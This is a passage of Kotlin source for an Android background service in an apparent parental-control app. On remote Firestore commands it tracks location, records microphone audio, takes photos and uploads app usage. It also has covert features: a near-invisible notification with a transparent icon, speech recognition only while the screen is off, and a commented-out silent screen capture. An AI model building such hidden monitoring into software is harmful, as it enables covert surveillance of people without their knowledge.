package com.controlparental.jerico

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.params.OutputConfiguration
import android.hardware.camera2.params.SessionConfiguration
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaPlayer
import android.media.MediaRecorder
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.speech.RecognitionListener
import android.speech.RecognizerIntent
import android.speech.SpeechRecognizer
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.firebase.Timestamp
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.GeoPoint
import com.google.firebase.firestore.SetOptions
import com.google.firebase.storage.FirebaseStorage
import java.io.File
import java.io.FileOutputStream
import java.util.Date
import java.util.Locale
import android.os.HandlerThread
import android.util.Size
import androidx.core.app.ActivityCompat
import java.util.concurrent.Executors
import okhttp3.*
import android.app.AppOpsManager
import android.app.PendingIntent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Matrix
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Data
import java.util.concurrent.TimeUnit
import androidx.work.Constraints
import android.media.AudioAttributes
// AudioFocusRequest import eliminado
import android.util.SparseIntArray
import android.view.Surface
import android.view.WindowManager
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider

import androidx.camera.core.*
import androidx.lifecycle.ProcessLifecycleOwner


import com.controlparental.jerico.usage.AppUsageManager
import com.controlparental.jerico.workers.AppUsageWorker
import com.google.firebase.firestore.DocumentReference
import com.google.firebase.firestore.FieldValue
import java.util.concurrent.ExecutorService
import android.app.usage.UsageStatsManager

import android.provider.Settings
import android.content.Intent.FLAG_ACTIVITY_NEW_TASK


class BackgroundService : Service() {

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var firestore: FirebaseFirestore
    private lateinit var auth: FirebaseAuth
    private lateinit var storage: FirebaseStorage
    private var locationCallback: LocationCallback? = null
    private var locationUpdateInterval: Long = 10000L // Intervalo por defecto
    private var recordingCycleDuration: Long = 60000L // 60 segundos de grabación por defecto
    private var isRecording = false
    private var recorder: MediaRecorder? = null
    private lateinit var handler: Handler
    private var filePath: String = ""
    private lateinit var batteryStatusReceiver: BatteryStatusReceiver
    private var lastBatteryPercentage: Float = -1f
    private var audioManager: AudioManager? = null
    private lateinit var handlerThread: HandlerThread
    private var imageReader: ImageReader? = null
    private lateinit var appUsageManager: AppUsageManager
    private var scannedDeviceId: String? = null

    // Variables globales en tu Activity o Service:
    private var speechRecognizer: SpeechRecognizer? = null
    private lateinit var recognizerIntent: Intent
    private var isListening: Boolean = false
    private var isPausedForAudio: Boolean = false
    private var audioCheckHandler: Handler? = null
    private var audioCheckRunnable: Runnable? = null

    // AudioFocusRequest eliminado para evitar pitidos

    private lateinit var cameraExecutor: ExecutorService
    private var imageCapture: ImageCapture? = null
    private var isCameraActive: Boolean = false


    override fun onCreate() {
        super.onCreate()
        Log.d("BackgroundService", "Service onCreate called")

        // Registrar el receptor para la activación manual
        val manualActivationIntentFilter = IntentFilter("com.controlparental.jerico.ACTION_MANUAL_ACTIVATE")
        registerReceiver(manualActivationReceiver, manualActivationIntentFilter, Context.RECEIVER_NOT_EXPORTED)

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        firestore = FirebaseFirestore.getInstance()
        auth = FirebaseAuth.getInstance()
        storage = FirebaseStorage.getInstance()
        handler = Handler(Looper.getMainLooper())
        appUsageManager = AppUsageManager(this)

        // Iniciar otros servicios
        cameraExecutor = Executors.newSingleThreadExecutor()

        startListeningForUserPreferences() // Escuchar cambios en Firebase
        startBackgroundThread()

        // Registrar el receptor de batería
        batteryStatusReceiver = BatteryStatusReceiver()
        val batteryFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        registerReceiver(batteryStatusReceiver, batteryFilter)

        if (!hasUsageStatsPermission(this)) {
            triggerUsageStatsManager() // 👈 nuevo: forzar uso antes de pedir permiso
            if (shouldRequestUsagePermission()) {
                markUsagePermissionRequested()
                Log.d("Permissions", "🟡 Lanzando pantalla de permisos USAGE_STATS desde onCreate")
                requestUsageAccess(this)
            } else {
                Log.w("Permissions", "🟠 Permiso USAGE_STATS aún no otorgado, pero ya fue solicitado anteriormente.")
            }
        }

        // Registrar el receptor de cambios de estado de la pantalla
        val screenFilter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
        }
        registerReceiver(screenStateReceiver, screenFilter)

        //cameraExecutor = Executors.newSingleThreadExecutor()


        // Inicializa el SpeechRecognizer
        initializeSpeechRecognizer()

        // Solo inicia el SpeechRecognizer si la pantalla está apagada
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (!powerManager.isInteractive) {
            tryStartSpeechRecognizer()
        } else {
            Log.d("BackgroundService", "La pantalla está encendida, SpeechRecognizer no se inicia")
        }
    }

    /*private fun capturarPantalla(userDocRef: DocumentReference) {
        try {
            val now = System.currentTimeMillis()
            val imageName = "screenshot_$now.png"
            val screenshotFile = File(externalCacheDir, imageName)

            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val display = windowManager.defaultDisplay
            val width = display.width
            val height = display.height

            val imageBitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
            val view = windowManager.defaultDisplay
            val canvas = android.graphics.Canvas(imageBitmap)
            val rootView = windowManager.defaultDisplay

            // 🚨 NOTA: Esto requiere un contexto de UI como una Activity o View para funcionar correctamente
            // En servicios no hay superficie visible. Este código no funcionará a menos que estés reflejando
            // la pantalla o tengas permisos especiales (requiere MediaProjection API en versiones modernas).
            // Aquí se muestra solo como referencia.

            // imageBitmap.copy(...) => implementar usando MediaProjection si es necesario

            val outputStream = FileOutputStream(screenshotFile)
            imageBitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream)
            outputStream.flush()
            outputStream.close()

            val fileUri = Uri.fromFile(screenshotFile)
            val storageRef = FirebaseStorage.getInstance().reference
                .child("screenshots/${screenshotFile.name}")

            storageRef.putFile(fileUri)
                .addOnSuccessListener {
                    storageRef.downloadUrl.addOnSuccessListener { downloadUri ->
                        val screenshotData = hashMapOf(
                            "screenshotUrl" to downloadUri.toString(),
                            "timestamp" to FieldValue.serverTimestamp()
                        )
                        userDocRef.collection("screenshots").add(screenshotData)
                            .addOnSuccessListener {
                                Log.d("Firestore", "✅ Screenshot guardado en Firestore.")
                                userDocRef.update("takePicture", false)
                                    .addOnSuccessListener {
                                        Log.d("Firestore", "✅ takePicture actualizado a false.")
                                    }
                            }
                    }
                }
                .addOnFailureListener { e ->
                    Log.e("Screenshot", "❌ Error al subir screenshot: ${e.message}")
                }

        } catch (e: Exception) {
            Log.e("Screenshot", "❌ Error al capturar pantalla: ${e.message}")
        }
    }*/

    private fun triggerUsageStatsManager() {
        try {
            val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val endTime = System.currentTimeMillis()
            val startTime = endTime - 1000 * 60 // últimos 60 segundos
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
            Log.d("UsageTrigger", "✅ Se ejecutó queryUsageStats con ${stats.size} resultados")
        } catch (e: Exception) {
            Log.e("UsageTrigger", "❌ Error al usar UsageStatsManager", e)
        }
    }

    private fun shouldRequestUsagePermission(): Boolean {
        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        return prefs.getBoolean("usagePermissionRequested", false).not()
    }

    private fun markUsagePermissionRequested() {
        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        prefs.edit().putBoolean("usagePermissionRequested", true).apply()
    }


    private fun requestUsageAccess(context: Context) {
        val intent = Intent(android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
    }

    @Suppress("DEPRECATION")
    private fun hasUsageStatsPermission(context: Context): Boolean {
        val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                context.packageName
            )
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                context.packageName
            )
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun startUsageWorker() {
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString() // Este debe devolver el deviceId del QR
        val inputData = Data.Builder()
            .putString("userId", userId)
            .putString("deviceId", deviceId)
            .build()

        val constraints = Constraints.Builder()
            .setRequiresDeviceIdle(true)   // Se intentará ejecutar solo cuando el dispositivo esté inactivo (API 23+)
            .build()

        val workRequest = PeriodicWorkRequestBuilder<AppUsageWorker>(30, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .setInputData(inputData)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "AppUsageWorker",
            androidx.work.ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
        Log.d("AppUsageWorker", "Service AppUsageWorker")
    }

    private fun checkCameraAvailability() {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraIdList = cameraManager.cameraIdList
        for (cameraId in cameraIdList) {
            val cameraCharacteristics = cameraManager.getCameraCharacteristics(cameraId)
            val cameraAvailable = cameraCharacteristics.get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL)
            Log.d("CameraCheck", "Camera $cameraId available: $cameraAvailable")
        }
    }

    companion object {
        private const val NOTIFICATION_ID = 1
        const val ACTION_TRIGGER_ALARM = "com.controlparental.jerico.ACTION_TRIGGER_ALARM"
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("BackgroundService", "Service onStartCommand called")
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        // Leer el deviceId escaneado de SharedPreferences

        // 🔍 Verificación de permisos
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            stopSelf()
            Toast.makeText(this, "Required permissions not granted", Toast.LENGTH_LONG).show()
            return START_NOT_STICKY
        }
        Log.d("BackgroundService", "Service onStartCommand called")
        // Verifica si se envió la acción para activar la alarma
        if (intent?.action == ACTION_TRIGGER_ALARM) {
            triggerAlarm()
        }
        // ✅ Iniciar en primer plano con una notificación persistente

        audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager

        initializeSpeechRecognizer() // 🎙️ Inicializar reconocimiento de voz
        startListeningForUserPreferences() // 🔄 Escuchar cambios en Firestore para manejar grabación/escucha
        startAudioMonitoring() // 🔊 Iniciar monitoreo de audio

        // 🎙️ Iniciar reconocimiento de voz automáticamente (sin audio focus)
        Handler(Looper.getMainLooper()).postDelayed({
            tryStartSpeechRecognizer()
        }, 2000) // Esperar 2 segundos para que se inicialice todo

        return START_STICKY
    }

    private fun createNotification(): Notification {
        val channelId = "BackgroundServiceChannel"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                getString(R.string.service_channel_name),
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(getString(R.string.service_name))
            .setContentText(getString(R.string.service_status))
            .setSmallIcon(R.drawable.logo)  // Usar el logo de WithU
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun checkPermissions(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
    }

    private fun startForegroundService() {
        val notificationChannelId = "ForegroundServiceChannel"
        val notificationChannelName = "Foreground Service Channel"

        val notificationChannel = NotificationChannel(notificationChannelId, notificationChannelName, NotificationManager.IMPORTANCE_LOW)
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.createNotificationChannel(notificationChannel)

        // Crear una notificación mínima
        val notification: Notification = NotificationCompat.Builder(this, notificationChannelId)
        .setContentTitle("") // Sin título
        .setContentText("") // Sin texto
        .setSmallIcon(R.drawable.ic_transparent) // Icono transparente para minimizar visibilidad
        .setPriority(NotificationCompat.PRIORITY_MIN) // Bajar la prioridad al mínimo
        .setOngoing(true) // Evita que el usuario la cierre
        .build()


        startForeground(1, notification)
    }

    // Aquí recibimos el estado de la batería y actualizamos Firestore
    inner class BatteryStatusReceiver : BroadcastReceiver() {
        private val firestore = FirebaseFirestore.getInstance()

        override fun onReceive(context: Context, intent: Intent) {
            // Obtener el porcentaje de batería
            val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1

            if (level != -1 && scale != -1) {
                // Convertir el porcentaje a un valor entre 0 y 1
                val batteryPercentage = level / scale.toFloat()
                Log.d("BatteryStatus", "Battery level: ${batteryPercentage}%")

                // Obtener userId y deviceId
                val userId = FirebaseAuth.getInstance().currentUser?.uid
                val deviceId = getDeviceIdAsString()

                // Si ambos userId y deviceId son válidos, actualizamos Firestore
                if (userId != null) {
                    if (hasBatteryChanged(batteryPercentage)) {
                        updateBatteryField(batteryPercentage, userId, deviceId)
                        lastBatteryPercentage = batteryPercentage
                    }
                }
            } else {
                Log.e("BatteryStatus", "Unable to get battery level")
            }
        }

        // Función que verifica si el porcentaje de batería ha cambiado en más de 1%
    private fun hasBatteryChanged(newBatteryPercentage: Float): Boolean {
        if (lastBatteryPercentage == -1f) {
            return true  // Si es la primera vez que se obtiene el valor, actualizar
        }
        // Si la diferencia es mayor que 0.01 (1% de cambio)
        return Math.abs(newBatteryPercentage - lastBatteryPercentage) >= 0.01
    }

    private fun updateBatteryField(batteryPercentage: Float, userId: String, deviceId: String) {
        val deviceDocRef = firestore.collection("users")
            .document(userId)
            .collection("devices")
            .document(deviceId)

        deviceDocRef.update("battery", batteryPercentage)
            .addOnSuccessListener {
                Log.d("BatteryStatus", "Battery level updated successfully")
            }
            .addOnFailureListener { e ->
                Log.e("BatteryStatus", "Failed to update battery level: ${e.message}")
            }
    }
    }


    private fun startListeningForUserPreferences() {
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()
        val deviceDocRef = firestore.collection("users").document(userId).collection("devices").document(deviceId)

        deviceDocRef.addSnapshotListener { snapshot, e ->
            if (e != null) {
                Log.e("BackgroundService", "Error listening for user data changes: ${e.message}")
                return@addSnapshotListener
            }

            if (snapshot != null && snapshot.exists()) {
                val trackingEnabled = snapshot.getBoolean("trackingEnabled") ?: true
                val newRecordingEnabled = snapshot.getBoolean("recordingEnabled") ?: false
                locationUpdateInterval = snapshot.getLong("locationUpdateInterval") ?: 10000L
                recordingCycleDuration = snapshot.getLong("recordingCycleDuration") ?: 60000L
                val takePhoto = snapshot.getBoolean("takePhoto") ?: false
                val takePicture = snapshot.getBoolean("takePicture") ?: false
                val soundEnabled = snapshot.getBoolean("sound") ?: false
                val requestUsagePermission = snapshot.getBoolean("requestUsagePermission") ?: false
                verificarPermisoDeUso(this, requestUsagePermission, deviceDocRef)
                val trackApps = snapshot.getBoolean("trackApps") ?: false

                // 🛰️ Manejar el tracking según Firestore
                if (trackingEnabled) {
                    stopLocationUpdates()
                    startLocationUpdates()
                } else {
                    stopLocationUpdates()
                }

                // 🎙️ Manejar la grabación de audio según Firestore
                if (newRecordingEnabled && !isRecording) {
                    stopListening() // 🔇 Detener el reconocimiento de voz antes de grabar
                    startRecordingCycle()
                } else if (!newRecordingEnabled && isRecording) {
                    stopRecordingAndUpload(filePath)
                   // startListening() // 🔊 Reactivar el reconocimiento de voz después de grabar
                }

                // 📸 Manejar la toma de fotos si `takePhoto` es `true`
                if (takePhoto) {
                    takePhotoAndUpload() // Tomar la foto y subirla
                    updateTakePhotoField(false) // Cambiar takePhoto a false después de tomar la foto
                }
                // 🖼️ Manejar captura de pantalla si `takePicture` es `true`
                /*if (takePicture == true) {
                    Log.d("SilentCapture", "📸 takePicture = true detectado. Intentando iniciar SilentCaptureActivity...")
                    launchSilentCaptureIfPermissionAvailable()
                }*/

                // 🔔 Reproducir sonido de alarma si `soundEnabled` es `true`
                if (soundEnabled) {
                    playAlarmSound() // Reproducir el sonido de alarma
                    updateSoundField(false, userId, deviceId) // Reiniciar el campo a `false`
                }
                // 📺 monitoreo apps
                if (trackApps) {
                    handleTrackApps(deviceDocRef)
                }

                // 👁️ Revisar si se debe volver a solicitar permiso USAGE_STATS

                if (requestUsagePermission) {
                    if (!hasUsageStatsPermission(this)) {
                        Log.d("Permissions", "🔁 Campo 'requestUsagePermission' es true. Lanzando pantalla de permisos.")
                        requestUsageAccess(this)
                        deviceDocRef.update("requestUsagePermission", false)
                            .addOnSuccessListener {
                                Log.d("Permissions", "🧹 requestUsagePermission actualizado a false después de lanzar pantalla de permiso.")
                            }
                            .addOnFailureListener { e ->
                                Log.e("Permissions", "❌ Error al actualizar requestUsagePermission: ${e.message}")
                            }
                    } else {
                        Log.d("Permissions", "✅ Permiso USAGE_STATS ya otorgado.")
                    }
                }
            }
        }
    }
    private fun handleTrackApps(deviceDocRef: DocumentReference) {
        val userId = auth.currentUser?.uid ?: return
        val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val endTime = System.currentTimeMillis()
        val startTime = endTime - TimeUnit.DAYS.toMillis(1) // Últimas 24 horas

        val stats = usageStatsManager.queryUsageStats(
            UsageStatsManager.INTERVAL_DAILY,
            startTime,
            endTime
        )
        val filteredStats = stats.filter { it.totalTimeInForeground >= 5 * 60 * 1000L }

        if (stats.isEmpty()) {
            Log.w("TrackApps", "No se encontraron estadísticas de uso")
            return
        }

        val usageRootRef = firestore.collection("users")
            .document(userId)
            .collection("devices")
            .document(getDeviceIdAsString())
            .collection("usage")

        val pm = packageManager

        for (usage in filteredStats) {
            try {
                val appInfo = pm.getApplicationInfo(usage.packageName, 0)
                val isSystemApp = (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0 ||
                                  (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
                if (isSystemApp) {
                    // Excluir apps del sistema, pero incluir apps relevantes como YouTube, Instagram, etc.
                    val allowlistedApps = listOf("com.google.android.youtube", "com.instagram.android", "com.facebook.katana")
                    if (!allowlistedApps.contains(usage.packageName)) continue
                }

                val segments = usage.packageName.split(".")
                val packageId = if (segments.size >= 3) segments[2] else usage.packageName

                val data = hashMapOf(
                    "packageName" to usage.packageName,
                    "totalTimeInForeground" to usage.totalTimeInForeground,
                    "lastTimeUsed" to usage.lastTimeUsed,
                    "firstTimeStamp" to usage.firstTimeStamp,
                    "lastTimeStamp" to usage.lastTimeStamp,
                    "timestampUpload" to Date()
                )

                usageRootRef.document(packageId).set(data, SetOptions.merge())
                    .addOnSuccessListener {
                        Log.d("TrackApps", "Uso guardado para paquete: ${usage.packageName}")
                    }
                    .addOnFailureListener { e ->
                        Log.e("TrackApps", "Error al guardar uso para ${usage.packageName}: ${e.message}")
                    }

            } catch (e: PackageManager.NameNotFoundException) {
                Log.e("TrackApps", "App no encontrada: ${usage.packageName}")
                continue
            }
        }

        // Resetear el campo después de la operación
        deviceDocRef.update("trackApps", false)
            .addOnSuccessListener {
                Log.d("TrackApps", "trackApps actualizado a false luego de la recolección")
            }
            .addOnFailureListener { e ->
                Log.e("TrackApps", "Error al actualizar trackApps: ${e.message}")
            }
    }

    private fun startLocationUpdates() {
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, locationUpdateInterval)
            .setMinUpdateIntervalMillis(locationUpdateInterval)
            .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                for (location in locationResult.locations) {
                    Log.d("BackgroundService", "Location: ${location.latitude}, ${location.longitude}, ${locationUpdateInterval}")
                    sendLocationToFirestore(location.latitude, location.longitude)
                }
            }
        }

        try {
            if (checkPermissions()) {
                fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback!!, null)
            } else {
                Log.e("BackgroundService", "Location permission not granted")
            }
        } catch (e: SecurityException) {
            Log.e("BackgroundService", "SecurityException: ${e.message}")
        }
    }

   /* private fun launchSilentCaptureIfPermissionAvailable() {
        val prefs = getSharedPreferences("ScreenCapturePrefs", Context.MODE_PRIVATE)
        val resultCode = prefs.getInt("resultCode", -1)
        val projectionIntentData = prefs.getString("projectionIntentData", null)

        if (resultCode == Activity.RESULT_OK && projectionIntentData != null) {
            try {
                val projectionIntent = Intent.parseUri(projectionIntentData, 0)

                val intent = Intent(this, SilentCaptureActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    putExtra("resultCode", resultCode)
                    putExtra("projectionData", projectionIntent)
                }

                Log.d("Capture", "🚀 Lanzando SilentCaptureActivity")
                startActivity(intent)
            } catch (e: Exception) {
                Log.e("Capture", "❌ Error al parsear projection intent", e)
            }
        } else {
            Log.w("Capture", "⚠️ No hay permiso guardado, lanzando ScreenPermissionActivity...")

            // Lanza la ScreenPermissionActivity solo si aún no se ha solicitado o guardado correctamente
            val intent = Intent(this, ScreenPermissionActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
        }
    }*/

    private var lastUpdateTimestamp: Long = 0

   /*  @SuppressLint("HardwareIds")
    private fun getDeviceIdAsString(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    } */
   private fun getDeviceIdAsString(): String {
       return DeviceIdHolder.deviceId ?: run {
           val sharedPreferences = getSharedPreferences("UserPrefs", Context.MODE_PRIVATE)
           val storedDeviceId = sharedPreferences.getString("idDevice", null)
           if (storedDeviceId != null) {
               DeviceIdHolder.deviceId = storedDeviceId
               return storedDeviceId
           } else {
               Log.e("BackgroundService", "DeviceId no encontrado, bloqueando acceso.")
               throw IllegalStateException("Dispositivo no permitido para esta cuenta")
           }
       }
   }

    private fun sendLocationToFirestore(latitude: Double, longitude: Double) {
        val currentTime = System.currentTimeMillis()

        if (currentTime - lastUpdateTimestamp >= locationUpdateInterval) {
            lastUpdateTimestamp = currentTime

            val user = auth.currentUser
            if (user != null) {
                val userId = user.uid
                val deviceId = getDeviceIdAsString()

                // Crear un objeto GeoPoint para las coordenadas
                val geoPoint = GeoPoint(latitude, longitude)

                // Obtener la fecha y hora actual
                val timestamp = Date()

                // Datos a guardar en la colección de dispositivos
                val locationData = hashMapOf(
                    "location" to geoPoint,
                    "timestamp" to timestamp
                )

                // Guardar la ubicación en la subcolección "locations" del dispositivo
                firestore.collection("users").document(userId)
                    .collection("devices").document(deviceId)
                    .collection("locations")
                    .add(locationData)
                    .addOnSuccessListener {
                        Log.d("BackgroundService", "Location successfully recorded in 'locations' collection for device: $deviceId")
                    }
                    .addOnFailureListener { e ->
                        Log.e("BackgroundService", "Error saving location: ${e.message}")
                    }

                // Actualizar el campo lastCoordinate y lastTimeStamp en el documento del dispositivo
                val deviceUpdates = hashMapOf(
                    "lastCoordinate" to geoPoint as Any,
                    "lastTimeStamp" to timestamp as Any
                )

                firestore.collection("users").document(userId)
                    .collection("devices").document(deviceId)
                    .set(deviceUpdates, SetOptions.merge())
                    .addOnSuccessListener {
                        Log.d("BackgroundService", "Device lastCoordinate and lastTimeStamp successfully updated")
                    }
                    .addOnFailureListener { e ->
                        Log.e("BackgroundService", "Error updating lastCoordinate and lastTimeStamp for device: ${e.message}")
                    }

            } else {
                Log.e("BackgroundService", "User not authenticated")
            }
        } else {
            Log.d("BackgroundService", "Skipping location update, interval not reached.")
        }
    }

    private fun stopLocationUpdates() {
        locationCallback?.let {
            fusedLocationClient.removeLocationUpdates(it)
            Log.d("BackgroundService", "Location updates stopped")
        }
    }

    private val uploadQueue = mutableListOf<File>()
    private var isUploading = false

    private fun startRecordingCycle() {
        if (isRecording) {
            Log.d("BackgroundService", "Recording is already running. Skipping start.")
            return
        }

        Log.d("BackgroundService", "Starting new recording cycle...")

        try {
            filePath = getRecordingFilePath()

            // Configuración del MediaRecorder según la versión de Android
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) { // Android 12+
                Log.d("BackgroundService", "Using MediaRecorder for Android 12+")
                MediaRecorder(applicationContext).apply {
                    setAudioSource(MediaRecorder.AudioSource.UNPROCESSED)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(192000)
                    setAudioSamplingRate(48000)
                    setOutputFile(filePath)
                    prepare()
                }
            } else { // Android 11 o inferior
                Log.d("BackgroundService", "Using MediaRecorder for Android 11 or lower")
                @Suppress("DEPRECATION")
                MediaRecorder().apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(128000)
                    setAudioSamplingRate(44100)
                    setOutputFile(filePath)
                    prepare()
                }
            }

            recorder?.apply {
                start()
            }

            isRecording = true
            Log.d("BackgroundService", "Recording started with file: $filePath")

            // Detener la grabación después del ciclo actual y programar el siguiente ciclo
            handler.postDelayed({
                Log.d("BackgroundService", "Recording cycle completed, stopping and uploading the file.")
                stopRecordingAndScheduleUpload(filePath)

                // Verificar si la grabación debe continuar, dependiendo de 'recordingEnabled' en Firestore
                checkRecordingEnabledAndRestartCycle()
            }, recordingCycleDuration)

        } catch (e: Exception) {
            Log.e("BackgroundService", "Failed to start recording: ${e.message}")
            stopRecordingAndScheduleUpload(filePath)
        }
    }

    private fun checkRecordingEnabledAndRestartCycle() {
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()
        val deviceDocRef = firestore.collection("users").document(userId).collection("devices").document(deviceId)

        deviceDocRef.get().addOnSuccessListener { snapshot ->
            if (snapshot.exists()) {
                val recordingEnabled = snapshot.getBoolean("recordingEnabled") ?: false
                if (recordingEnabled) {
                    Log.d("BackgroundService", "recordingEnabled is true, restarting the recording cycle.")
                    startRecordingCycle() // Reiniciar el ciclo si recordingEnabled sigue en true
                } else {
                    Log.d("BackgroundService", "recordingEnabled is false, stopping the recording cycle.")
                }
            } else {
                Log.e("BackgroundService", "Device document not found.")
            }
        }.addOnFailureListener { e ->
            Log.e("BackgroundService", "Error checking recordingEnabled: ${e.message}")
        }
    }

    private fun stopRecordingAndScheduleUpload(filePath: String?) {
        if (!isRecording) return

        try {
            recorder?.apply {
                stop()
                reset()
                release()
            }
            recorder = null
            isRecording = false
            Log.d("BackgroundService", "Recording stopped. File saved at: $filePath")
        } catch (e: Exception) {
            Log.e("BackgroundService", "Failed to stop recording: ${e.message}")
        }

        filePath?.let {
            val file = File(it)
            if (file.exists()) {
                uploadRecordingToStorage(file)
            } else {
                Log.e("BackgroundService", "File not found: $it")
            }
        }
    }

    private fun processUploadQueue() {
        if (isUploading) return // Evitar procesar múltiples subidas simultáneamente

        synchronized(uploadQueue) {
            if (uploadQueue.isEmpty()) return
            isUploading = true
            val fileToUpload = uploadQueue.removeAt(0)

            uploadRecordingToStorage(fileToUpload)
        }
    }

    private fun compressAudioFile(inputFilePath: String, outputFilePath: String): Boolean {
        return try {
            val inputFile = File(inputFilePath)
            val outputFile = File(outputFilePath)

            if (!inputFile.exists()) {
                Log.e("BackgroundService", "Input file does not exist")
                return false
            }

            // Copiar el archivo como está (mejor compresión requiere bibliotecas adicionales como FFmpeg)
            inputFile.copyTo(outputFile, overwrite = true)
            true
        } catch (e: Exception) {
            Log.e("BackgroundService", "Failed to compress audio file: ${e.message}")
            false
        }
    }

    private fun stopRecordingAndUpload(filePath: String) {
        try {
            recorder?.apply {
                stop()
                release()
            }
            recorder = null
            isRecording = false

            val file = File(filePath)
            if (file.exists() && file.length() > 0) {
                val compressedFilePath = "${applicationContext.filesDir}/compressed_${System.currentTimeMillis()}.mp4"
                if (compressAudioFile(filePath, compressedFilePath)) {
